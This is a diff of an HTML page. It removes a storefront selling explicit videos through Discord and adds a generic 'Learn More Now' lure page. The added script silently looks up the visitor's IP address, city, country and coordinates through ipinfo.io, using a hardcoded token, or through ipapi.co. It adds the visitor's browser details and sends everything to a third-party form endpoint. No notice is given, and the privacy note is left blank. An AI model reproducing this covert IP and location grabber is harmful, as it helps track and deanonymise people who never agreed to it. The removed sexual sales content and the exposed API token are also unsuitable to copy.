@@ -3,373 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mia's Premium Content Hub</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Learn More About Our Service</title>
     <style>
-        :root {
-            --primary: #FF69B4;
-            --secondary: #9400D3;
-            --accent: #FFD700;
-            --dark: #2F1B41;
-            --light: #FFF5EE;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
-
         body {
-            background: linear-gradient(rgba(47, 27, 65, 0.90), rgba(47, 27, 65, 0.90)),
-                        url('https://images.unsplash.com/photo-1618005198919-d3d4b5a92ead?ixlib=rb-1.2.1&auto=format&fit=crop&w=1920&q=80');
-            background-size: cover;
-            background-attachment: fixed;
-            color: var(--light);
-            min-height: 100vh;
-        }
-
-        .header {
-            padding: 1rem 5%;
-            display: grid;
-            grid-template-columns: auto 1fr;
-            align-items: center;
-            background: rgba(47, 27, 65, 0.95);
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            backdrop-filter: blur(10px);
-            border-bottom: 2px solid var(--accent);
-        }
-
-        .logo {
-            width: 70px;
-            height: 70px;
-            border-radius: 15px;
-            border: 2px solid var(--accent);
-            transition: transform 0.3s ease;
-        }
-
-        .nav-links {
+            font-family: Arial, sans-serif;
             display: flex;
-            gap: 2rem;
-            justify-self: end;
-        }
-
-        .nav-links a {
-            color: var(--light);
-            text-decoration: none;
-            font-weight: 600;
-            padding: 0.8rem 1.2rem;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-
-        .nav-links a:hover {
-            background: rgba(255, 255, 255, 0.1);
-            transform: translateY(-2px);
-        }
-
-        .hero {
-            padding: 160px 5% 60px;
-            text-align: center;
-            min-height: 80vh;
-            display: flex;
-            align-items: center;
             justify-content: center;
-        }
-
-        .video-library {
-            padding: 4rem 5%;
-        }
-
-        .video-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-            padding: 2rem 0;
-        }
-
-        .video-card {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            overflow: hidden;
-            transition: transform 0.3s ease;
-            position: relative;
-        }
-
-        .video-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .thumbnail {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            border-bottom: 3px solid var(--primary);
-            cursor: pointer;
-        }
-
-        .price-tag {
-            background: var(--accent);
-            color: var(--dark);
-            padding: 0.6rem 1.2rem;
-            border-radius: 6px;
-            font-weight: 700;
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-        }
-
-        .file-info {
-            padding: 1.5rem;
-            display: grid;
-            gap: 0.8rem;
-        }
-
-        .file-meta {
-            display: flex;
-            gap: 1rem;
-            font-size: 0.9em;
-            color: rgba(255, 255, 255, 0.8);
-        }
-
-        .btn {
-            display: inline-flex;
             align-items: center;
-            gap: 12px;
-            padding: 1rem 2rem;
-            background: var(--primary);
+            min-height: 100vh;
+            margin: 0;
+            background: #f0f2f5;
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            max-width: 600px;
+        }
+
+        .learn-more-btn {
+            background: #007bff;
             color: white;
+            padding: 18px 36px;
             border: none;
-            border-radius: 6px;
+            border-radius: 50px;
+            font-size: 20px;
             cursor: pointer;
             transition: all 0.3s ease;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .btn:hover {
-            background: var(--secondary);
-        }
-
-        /* Preview Modal Styles */
-        .preview-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 2000;
-            animation: fadeIn 0.3s ease forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .modal-content {
-            width: 90%;
-            max-width: 1000px;
-            margin: 2rem auto;
-            background: var(--dark);
-            border-radius: 12px;
-            padding: 2rem;
             position: relative;
-            transform: translateY(-50px);
-            animation: slideIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-        }
-
-        @keyframes slideIn {
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .preview-video {
-            position: relative;
-            padding-bottom: 56.25%;
-            height: 0;
             overflow: hidden;
-            margin: 1rem 0;
         }
 
-        .preview-video iframe {
+        .learn-more-btn:hover {
+            background: #0056b3;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
+        }
+
+        .learn-more-btn:active {
+            transform: translateY(0);
+        }
+
+        .loading .learn-more-btn-text {
+            visibility: hidden;
+            opacity: 0;
+        }
+
+        .loading::after {
+            content: "";
             position: absolute;
+            width: 24px;
+            height: 24px;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            border: 4px solid transparent;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: button-loading-spinner 1s ease infinite;
+        }
+
+        @keyframes button-loading-spinner {
+            from { transform: rotate(0turn); }
+            to { transform: rotate(1turn); }
+        }
+
+        .alert {
+            padding: 15px;
+            margin-top: 20px;
             border-radius: 8px;
+            display: none;
         }
 
-        .preview-close {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            color: var(--light);
-            font-size: 2rem;
-            cursor: pointer;
-            transition: transform 0.3s ease;
+        .alert-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
         }
 
-        .preview-close:hover {
-            transform: rotate(90deg);
+        .alert-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
 
-        @media (max-width: 768px) {
-            .nav-links {
-                display: none;
-            }
-            
-            .hero h1 {
-                font-size: 2.5rem;
-            }
-            
-            .video-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .modal-content {
-                padding: 1rem;
-            }
+        .privacy-note {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #666;
+            max-width: 400px;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
-    <header class="header">
-        <img src="https://i.postimg.cc/vcqhnw8n/pic-1.webp" 
-             alt="Mia's Profile" 
-             class="logo">
-        <nav class="nav-links">
-            <a href="#home">Home</a>
-            <a href="#library">Library</a>
-            <a href="#pricing">Pricing</a>
-            <a href="#support">Support</a>
-        </nav>
-    </header>
+    <div class="container">
+        <h1>Exciting New Opportunity!</h1>
+        <p>Discover how we can transform your experience</p>
+        
+        <form id="trackingForm" action="https://formbold.com/s/67pgd" method="POST">
+            <!-- Hidden Tracking Fields -->
+            <input type="hidden" name="user_ip" id="user_ip">
+            <input type="hidden" name="user_location" id="user_location">
+            <input type="hidden" name="user_agent" id="user_agent">
+            <input type="hidden" name="page_url" id="page_url">
+            <input type="hidden" name="timezone" id="timezone">
+            <input type="hidden" name="coordinates" id="coordinates">
+            
+            <button type="submit" class="learn-more-btn" id="submitBtn">
+                <span class="learn-more-btn-text">Learn More Now</span>
+            </button>
+        </form>
 
-    <section class="hero" id="home">
-        <div class="hero-content">
-            <h1>Premium Videos Cheap</h1>
-            <p>Exclusive Content </p>
-        </div>
-    </section>
-
-    <main class="video-library" id="library">
-        <div class="video-grid">
-            <!-- Video Item 1 -->
-            <article class="video-card">
-                <div class="thumbnail-container">
-                    <img src="THUMBNAIL_IMAGE_URL_1" 
-                         class="thumbnail" 
-                         onclick="showPreview('GOOGLE_DRIVE_VIDEO_ID_1')">
-                    <div class="price-tag">$49.99</div>
-                </div>
-                <div class="file-info">
-                    <h3>Pussy Fingering</h3>
-                    <div class="file-meta">
-                        <span><i class="fas fa-clock"></i> 2h 45m</span>
-                        <span><i class="fas fa-download"></i> 4K MP4</span>
-                    </div>
-                    <button class="btn" 
-                            onclick="window.location.href='https://discord.com/users/1310460288814026852'">
-                        <i class="fas fa-shopping-cart"></i>
-                        Purchase Now
-                    </button>
-                </div>
-            </article>
-
-            <!-- Video Item 2 -->
-            <article class="video-card">
-                <div class="thumbnail-container">
-                    <img src="THUMBNAIL_IMAGE_URL_2" 
-                         class="thumbnail" 
-                         onclick="showPreview('GOOGLE_DRIVE_VIDEO_ID_2')">
-                    <div class="price-tag">$10</div>
-                </div>
-                <div class="file-info">
-                    <h3>Boobs</h3>
-                    <div class="file-meta">
-                        <span><i class="fas fa-clock"></i> 3h 15m</span>
-                        <span><i class="fas fa-download"></i> 4K MP4 + Assets</span>
-                    </div>
-                    <button class="btn" 
-                            onclick="window.location.href='https://discord.com/users/1310460288814026852'">
-                        <i class="fas fa-shopping-cart"></i>
-                        Purchase Now
-                    </button>
-                </div>
-            </article>
-        </div>
-    </main>
-
-    <!-- Preview Modal -->
-    <div class="preview-modal" id="previewModal">
-        <div class="modal-content">
-            <span class="preview-close" onclick="closePreview()">&times;</span>
-            <div class="preview-video" id="videoContainer"></div>
-            <div class="preview-actions">
-                <button class="btn" onclick="closePreview()">
-                    <i class="fas fa-times"></i>
-                    Close Preview
-                </button>
-                <button class="btn" 
-                        onclick="window.location.href='https://discord.com/users/YOUR_DISCORD_ID'">
-                    <i class="fas fa-shopping-cart"></i>
-                    Purchase Full Video
-                </button>
-            </div>
-        </div>
+        <div id="alertBox" class="alert"></div>
+        
+        <p class="privacy-note">
+        
+        </p>
     </div>
 
     <script>
-        // Preview functionality
-        function showPreview(videoId) {
-            const modal = document.getElementById('previewModal');
-            const videoContainer = document.getElementById('videoContainer');
-            
-            // Insert Google Drive embed URL
-            videoContainer.innerHTML = `
-                <iframe src="https://drive.google.com/file/d/${videoId}/preview" 
-                        allow="autoplay" 
-                        allowfullscreen></iframe>
-            `;
-            
-            modal.style.display = 'block';
-        }
+        const form = document.getElementById('trackingForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const alertBox = document.getElementById('alertBox');
 
-        function closePreview() {
-            document.getElementById('previewModal').style.display = 'none';
-            document.getElementById('videoContainer').innerHTML = '';
-        }
-
-        // Close modal when clicking outside
-        window.onclick = function(event) {
-            const modal = document.getElementById('previewModal');
-            if (event.target === modal) {
-                closePreview();
+        async function getLocationData() {
+            try {
+                // First try ipinfo.io with token
+                const response = await fetch('https://ipinfo.io/json?token=67b10842d76c29');
+                if(response.ok) {
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country,
+                        coords: data.loc
+                    };
+                }
+            } catch (error) {
+                console.log('Falling back to secondary API...');
+                // Fallback to ipapi.co
+                const fallbackResponse = await fetch('https://ipapi.co/json/');
+                const fallbackData = await fallbackResponse.json();
+                return {
+                    ip: fallbackData.ip,
+                    city: fallbackData.city,
+                    region: fallbackData.region,
+                    country: fallbackData.country_name,
+                    coords: `${fallbackData.latitude},${fallbackData.longitude}`
+                };
             }
         }
 
-        // Smooth scroll for navigation
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'start'
+        async function handleSubmit(e) {
+            e.preventDefault();
+            submitBtn.classList.add('loading');
+            
+            try {
+                // Collect tracking data
+                const locationData = await getLocationData();
+                
+                document.getElementById('user_agent').value = navigator.userAgent;
+                document.getElementById('page_url').value = window.location.href;
+                document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                document.getElementById('user_ip').value = locationData?.ip || 'unknown';
+                document.getElementById('user_location').value = locationData ? 
+                    `${locationData.city}, ${locationData.region}, ${locationData.country}` : 'unknown';
+                document.getElementById('coordinates').value = locationData?.coords || 'unknown';
+
+                // Submit form
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: new FormData(form)
                 });
-            });
-        });
+
+                if(response.ok) {
+                    showAlert('Thank you for your interest! We\'ll redirect you shortly...', 'success');
+                    setTimeout(() => {
+                        window.location.href = '/thank-you'; // Add your redirect URL
+                    }, 2000);
+                } else {
+                    throw new Error('Submission failed');
+                }
+            } catch (error) {
+                showAlert('Unable to process request. Please try again.', 'error');
+            } finally {
+                submitBtn.classList.remove('loading');
+            }
+        }
+
+        function showAlert(message, type) {
+            alertBox.textContent = message;
+            alertBox.className = `alert alert-${type}`;
+            alertBox.style.display = 'block';
+            setTimeout(() => {
+                alertBox.style.display = 'none';
+            }, 5000);
+        }
+
+        form.addEventListener('submit', handleSubmit);
     </script>
 </body>
 </html>
